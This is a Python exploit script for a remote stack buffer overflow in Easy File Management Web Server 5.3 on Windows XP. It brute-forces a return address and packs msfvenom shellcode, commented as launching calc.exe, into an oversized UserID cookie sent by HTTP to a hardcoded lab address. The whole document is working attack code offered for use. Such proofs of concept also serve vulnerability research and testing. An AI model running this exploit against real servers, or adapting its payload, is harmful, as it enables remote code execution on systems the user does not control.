# Exploit Title: Easy File Management Web Server 5.3 - Remote Stack Buffer Overflow
# Tested on: Windows XP SP3 32bit
# Reference: https://www.exploit-db.com/exploits/33453

import sys
import struct
import socket

host = "192.168.56.38"
port = 80

#0x7756a634 : ptr to 0x7cfd850f (-> ptr to "jmp esi") **  |  {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ole32.dll)
for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]

    # 467342:  call dword ptr [edx+28h]

    guess = "0x01" + n + "7948"
    print("[+] trying " + guess)

    guess = struct.pack("<I",int(guess,16))

    payload = "A"*300 + "\x0f\x85\xfd\x7c" + "A"*(320 - 304) + "\xeb\x24"
    payload = payload + "\x90"*(336 - len(payload)) 
    payload = payload + guess + "\x90"*0x50

    # msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f py -b "\x00\x3b"
    buf =  b""
    buf += b"\xbf\xd2\xf2\xc2\xd7\xdd\xc7\xd9\x74\x24\xf4\x5d\x29"
    buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x7d\x0f\x03\x7d\xdd\x10"
    buf += b"\x37\x2b\x09\x56\xb8\xd4\xc9\x37\x30\x31\xf8\x77\x26"
    buf += b"\x31\xaa\x47\x2c\x17\x46\x23\x60\x8c\xdd\x41\xad\xa3"
    buf += b"\x56\xef\x8b\x8a\x67\x5c\xef\x8d\xeb\x9f\x3c\x6e\xd2"
    buf += b"\x6f\x31\x6f\x13\x8d\xb8\x3d\xcc\xd9\x6f\xd2\x79\x97"
    buf += b"\xb3\x59\x31\x39\xb4\xbe\x81\x38\x95\x10\x9a\x62\x35"
    buf += b"\x92\x4f\x1f\x7c\x8c\x8c\x1a\x36\x27\x66\xd0\xc9\xe1"
    buf += b"\xb7\x19\x65\xcc\x78\xe8\x77\x08\xbe\x13\x02\x60\xbd"
    buf += b"\xae\x15\xb7\xbc\x74\x93\x2c\x66\xfe\x03\x89\x97\xd3"
    buf += b"\xd2\x5a\x9b\x98\x91\x05\xbf\x1f\x75\x3e\xbb\x94\x78"
    buf += b"\x91\x4a\xee\x5e\x35\x17\xb4\xff\x6c\xfd\x1b\xff\x6f"
    buf += b"\x5e\xc3\xa5\xe4\x72\x10\xd4\xa6\x18\xe7\x6a\xdd\x6e"
    buf += b"\xe7\x74\xde\xde\x80\x45\x55\xb1\xd7\x59\xbc\xf6\x28"
    buf += b"\x10\x9d\x5e\xa1\xfd\x77\xe3\xac\xfd\xad\x27\xc9\x7d"
    buf += b"\x44\xd7\x2e\x9d\x2d\xd2\x6b\x19\xdd\xae\xe4\xcc\xe1"
    buf += b"\x1d\x04\xc5\x81\xc0\x96\x85\x6b\x67\x1f\x2f\x74"

    payload = payload + buf

    payload = payload + "B"*(2000 - len(payload))

    buf = (
    "GET / HTTP/1.1\r\n"
   # "User-Agent: Mozilla/4.0\r\n"
    "Host:" + host + ":" + str(port) + "\r\n"
   # "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
   # "Accept-Language: en-us\r\n"
   # "Accept-Encoding: gzip, deflate\r\n"
   # "Referer: http://" + host + "/\r\n"
   # "Cookie: SESSIONID=6771; UserID=" + payload  + "; PassWD=;\r\n"
    "Cookie: SESSIONID=1; UserID=" + payload  + ";\r\n"
   # "Conection: Keep-Alive\r\n\r\n"
    )

    #print("Sending payload....")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect = s.connect((host,port))
    s.send(buf)
    s.close()

